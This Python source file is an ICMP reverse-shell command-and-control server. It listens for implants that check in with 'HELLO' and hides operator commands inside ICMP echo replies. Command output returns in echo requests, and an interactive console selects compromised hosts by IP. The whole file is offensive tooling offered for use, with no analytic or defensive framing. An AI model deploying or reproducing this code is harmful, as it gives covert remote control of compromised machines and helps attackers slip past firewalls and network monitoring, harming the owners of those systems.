#!/usr/bin/env python3
"""
ICMP Reverse Shell - C2 Server
Listens for ICMP packets from implant, sends commands via ICMP replies
Works on: Linux & Windows (with admin rights)
"""

import socket
import struct
import os
import sys
import time
import threading

class ICMPC2Server:
    def __init__(self, listen_ip="0.0.0.0"):
        self.listen_ip = listen_ip
        self.sock = None
        self.active_clients = {}  # {client_ip: {"id": icmp_id, "seq": last_seq}}
        self.running = True
        
    def create_socket(self):
        """Create raw ICMP socket"""
        try:
            # Windows uses different protocol
            if os.name == 'nt':
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            else:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            print("[+] ICMP socket created")
            return True
        except PermissionError:
            print("[-] Admin/root privileges required!")
            return False
        except Exception as e:
            print(f"[-] Socket error: {e}")
            return False
    
    def checksum(self, data):
        """Calculate ICMP checksum"""
        total = 0
        count = len(data)
        for i in range(0, count, 2):
            if i + 1 < count:
                total += (data[i] << 8) + data[i + 1]
            else:
                total += data[i] << 8
        
        while total >> 16:
            total = (total & 0xFFFF) + (total >> 16)
        return ~total & 0xFFFF
    
    def create_icmp_reply(self, payload, icmp_id, seq):
        """Create ICMP Echo Reply packet"""
        icmp_type = 0  # Echo Reply
        icmp_code = 0
        icmp_checksum = 0
        
        # Pack header
        header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, seq)
        data = payload.encode('utf-8') if isinstance(payload, str) else payload
        packet = header + data
        
        # Calculate checksum
        icmp_checksum = self.checksum(packet)
        header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, seq)
        
        return header + data
    
    def send_command(self, client_ip, command, icmp_id, seq):
        """Send command to implant"""
        packet = self.create_icmp_reply(command, icmp_id, seq)
        self.sock.sendto(packet, (client_ip, 0))
        return seq + 1
    
    def listen(self):
        """Listen for incoming ICMP packets"""
        print(f"[*] Listening on {self.listen_ip}")
        print("[*] Waiting for implants to call home...\n")
        
        while self.running:
            try:
                self.sock.settimeout(1)
                packet, addr = self.sock.recvfrom(4096)
                
                # Parse IP header (first 20 bytes)
                ip_header = packet[:20]
                protocol = ip_header[9]
                
                if protocol != 1:  # Not ICMP
                    continue
                
                # Parse ICMP header
                icmp_header = packet[20:28]
                icmp_type, icmp_code, _, icmp_id, icmp_seq = struct.unpack('!BBHHH', icmp_header)
                
                # Get payload
                payload = packet[28:].decode('utf-8', errors='ignore').strip('\x00')
                
                # Handle Echo Request (type 8)
                if icmp_type == 8:
                    client_ip = addr[0]
                    
                    # New client?
                    if client_ip not in self.active_clients:
                        if payload == "HELLO":
                            self.active_clients[client_ip] = {
                                "id": icmp_id,
                                "seq": icmp_seq,
                                "last_seen": time.time()
                            }
                            print(f"[+] New implant connected: {client_ip}")
                            self.send_command(client_ip, "READY", icmp_id, icmp_seq + 1)
                    
                    # Handle response from existing client
                    elif client_ip in self.active_clients and payload:
                        if payload != "HEARTBEAT" and payload != "PONG":
                            print(f"\n[+] Response from {client_ip}:")
                            print("-" * 40)
                            print(payload)
                            print("-" * 40)
                            print(f"\n{client_ip}> ", end="", flush=True)
                    
                    # Update last seen
                    if client_ip in self.active_clients:
                        self.active_clients[client_ip]["last_seen"] = time.time()
                        
            except socket.timeout:
                continue
            except KeyboardInterrupt:
                print("\n[-] Shutting down...")
                self.running = False
                break
            except Exception as e:
                print(f"[-] Error: {e}")
    
    def interactive_shell(self):
        """Interactive shell for sending commands"""
        print("\n[*] Interactive mode ready")
        print("[*] Commands:")
        print("    list              - Show connected implants")
        print("    select <IP>       - Select target")
        print("    exit              - Quit\n")
        
        current_target = None
        current_seq = 0
        
        while self.running:
            try:
                if current_target:
                    cmd = input(f"{current_target}> ")
                else:
                    cmd = input("(no target)> ")
                
                if cmd.lower() == "exit":
                    self.running = False
                    break
                
                elif cmd.lower() == "list":
                    if not self.active_clients:
                        print("[-] No connected implants")
                    else:
                        print("\nConnected implants:")
                        for ip, info in self.active_clients.items():
                            print(f"  - {ip} (last seen: {time.ctime(info['last_seen'])})")
                    print()
                
                elif cmd.lower().startswith("select "):
                    target_ip = cmd.split()[1]
                    if target_ip in self.active_clients:
                        current_target = target_ip
                        current_seq = self.active_clients[target_ip]["seq"] + 1
                        print(f"[+] Now targeting: {current_target}")
                    else:
                        print(f"[-] {target_ip} not connected")
                
                elif current_target and cmd.strip():
                    # Send command to selected implant
                    client_info = self.active_clients[current_target]
                    self.send_command(current_target, cmd, client_info["id"], current_seq)
                    current_seq += 1
                
                elif not current_target:
                    print("[-] No target selected. Use 'select <IP>' first")
                    
            except KeyboardInterrupt:
                continue
            except EOFError:
                break
    
    def run(self):
        """Main execution"""
        if self.create_socket():
            # Start listener thread
            listen_thread = threading.Thread(target=self.listen, daemon=True)
            listen_thread.start()
            
            # Start interactive shell
            self.interactive_shell()

if __name__ == "__main__":
    if os.name != 'nt' and os.geteuid() != 0:
        print("[-] Run with sudo on Linux")
        sys.exit(1)
    
    server = ICMPC2Server()
    server.run()